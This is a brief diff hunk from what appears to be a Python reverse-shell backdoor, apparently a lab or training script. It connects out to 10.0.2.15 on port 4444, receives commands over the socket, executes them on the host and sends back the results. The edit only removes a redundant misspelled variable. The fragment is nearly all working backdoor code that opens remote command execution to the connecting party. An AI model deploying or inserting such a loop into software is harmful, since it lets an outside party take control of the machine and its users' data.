@@ -12,7 +12,7 @@ connection.connect(("10.0.2.15", 4444))
 #connection.send("\n[+] Connection established.\n")
 
 while True:
-    command = recieved_data = connection.recv(1024)
+    command = connection.recv(1024)
     command_result = execute_system_command(command)
     connection.send(command_result)
 
